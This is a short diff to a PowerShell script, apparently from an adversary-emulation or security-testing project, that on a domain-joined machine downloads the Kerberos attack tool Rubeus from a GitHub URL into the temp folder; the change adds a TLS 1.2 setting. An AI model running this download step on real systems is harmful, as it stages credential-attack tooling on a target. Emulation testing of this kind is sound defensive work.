@@ -9,6 +9,7 @@ if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
 if(Test-Path -Path $Env:temp\rubeus.exe) {
     
 } else {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe -OutFile $Env:temp\rubeus.exe
 }
 
